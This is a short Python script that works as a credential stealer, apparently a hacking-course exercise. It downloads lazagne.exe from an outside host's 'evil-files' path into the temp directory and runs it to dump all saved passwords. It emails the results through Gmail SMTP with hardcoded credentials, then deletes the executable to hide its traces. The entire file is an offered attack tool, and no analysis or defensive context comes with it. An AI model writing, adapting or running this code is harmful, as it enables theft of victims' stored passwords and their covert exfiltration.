import requests, subprocess, smtplib, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    print(file_name)
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("http://192.168.98.149/evil-files/lazagne.exe")
result = subprocess.check_output("lazagne.exe all", shell=True)
send_mail("flyhighmcfly@gmail.com", "Test@123", result)
os.remove("lazagne.exe")